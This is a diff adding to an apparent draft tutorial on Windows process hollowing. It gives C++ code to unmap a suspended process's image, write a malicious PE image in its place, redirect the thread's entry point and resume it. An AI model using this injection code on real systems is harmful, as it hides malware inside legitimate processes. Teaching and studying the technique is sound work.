@@ -197,9 +197,139 @@ ReadProcessMemory(
 ```
 `Rdx` register holds the address of the `PEB` struct which holds the **base address** variable inside of it.
 
+then `ReadProcessMemory` will read the data (memory address in our case) and store it inside `pVictimImageBaseAddres` variable.
+
 > TODO: explain better maybe?
 
 Why 0x10 (16 byte)? Check the `PEB` struct: https://rinseandrepeatanalysis.blogspot.com/p/peb-structure.html
+
+The **base address** is where we want to start to carve out. Since we know it, we can start to unmap operation.
+
+To unmap, we need `NtUnmapViewOfSection` method which is part of the `ntdll.lib`. In C++ we can simply load a dll at runtime as followed:
+
+```cpp
+#include <winternl.h>
+
+#pragma comment(lib, "ntdll.lib")
+extern "C" NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE, PVOID);
+```
+
+Then we can do the unmap operation.
+
+```cpp
+DWORD dwResult = NtUnmapViewOfSection(
+	victim_pi->hProcess,
+	pVictimImageBaseAddress
+);
+```
+
+> TODO: Show how unmap trims the data from the memory with HxD
+
+### Writing Malicious Image
+
+The PE image on the disk is different than how it is inside the virtual address space. So we can not load it with just one operation. PE file stores which data will be written where in virtual address space, so we will read this data and write according to it.
+
+Let's read the PE headers of the malicious image.
+
+```cpp
+PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage;
+PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew);
+
+DWORD maliciousImageBaseAddress = pNTHeaders->OptionalHeader.ImageBase;
+DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage; 
+```
+
+`e_lfanew` identifies the number of bytes from the DOS header to the PE header
+
+Then we will allocate memory for writing because the malicious code that we will write into the unmapped address space probably is different than the carved-out space. So let's allocate space starting from the **base address**.
+
+```cpp
+PVOID pHollowAddress = VirtualAllocEx(
+    victim_pi->hProcess,
+    pVictimImageBaseAddress, // Base address of the process
+    sizeOfMaliciousImage, // Byte size obtained from optional header
+    0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
+    0x40 // Enabled execute and read/write access (PAGE_EXECUTE_READWRITE)
+);
+```
+
+TODO: Show with HxD
+
+We will start with writing the PE headers into the memory, then we will look inside of those headers to learn where we will write the remaining sections of it.
+
+```cpp
+WriteProcessMemory(
+    victim_pi->hProcess, 
+    pVictimImageBaseAddress,
+    pMaliciousImage,
+    pNTHeaders->OptionalHeader.SizeOfHeaders, // Byte size of PE headers 
+    NULL
+);
+```
+
+PE file has multiple sections, so it's convinient to use a for loop and write each section.
+
+```cpp
+for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) { 
+	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))); // Determines the current PE section header
+
+	printf("\t[*] Section written at address: %p\r\n", (PVOID)((LPBYTE)pHollowAddress + pSectionHeader->VirtualAddress));
+	WriteProcessMemory(
+		victim_pi->hProcess, // Handle of the process obtained from the PROCESS_INFORMATION structure
+		(PVOID)((LPBYTE)pHollowAddress + pSectionHeader->VirtualAddress), // Base address of current section 
+		(PVOID)((LPBYTE)pMaliciousImage + pSectionHeader->PointerToRawData), // Pointer for content of current section
+		pSectionHeader->SizeOfRawData, // Byte size of current section
+		NULL
+	);
+}
+```
+> TODO: this part look messy, maybe clarify this code
+
+### Resuming the Thread
+
+Check your process with printing errors out, if no error congrats you successfully made your surgery, but now we need to stitch the open process and resume the `SUSPENDED` thread.
+
+We changed the process internal compleatly, so the registers that holds (`Rip` register) the execution point, now pointing an invalid location. It should point where the code execution starts, the **entry point**.
+
+Note that, `IP` means "Instruction Point", for 64-bit CPU use `Rip` and for 32-bit it use `Eip` register.
+
+Okay we understand that it's necassary to change `Rip` value, but how we will know the **entry point**. Well, `OptionalHeader` of the PE file stores this data.
+
+```cpp
+	ctx.ContextFlags = CONTEXT_FULL;
+	ctx.Rip = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint); 	
+    
+    SetThreadContext(
+		victim_pi->hThread, // Handle to the thread obtained from the PROCESS_INFORMATION structure
+		&ctx // Pointer to the stored context structure
+	);
+```
+
+Don't forgot that `AddressOfEntryPoint` is relative so we add **base address** with it.
+
+Then simply we will resume our thread, and cleanup the handles and the allocated space for the malicious image.
+
+```cpp
+	ResumeThread(
+		victim_pi->hThread 
+	);
+
+	CloseHandle(victim_pi->hThread);
+	CloseHandle(victim_pi->hProcess);
+	VirtualFree(pMaliciousImage, 0, MEM_RELEASE);
+```
+
+Cross your fingers, if we did everything correct, now we will see our malicious process will work inside its host.
+
+
+
+
+
+
+
+
+
+
 
 
 
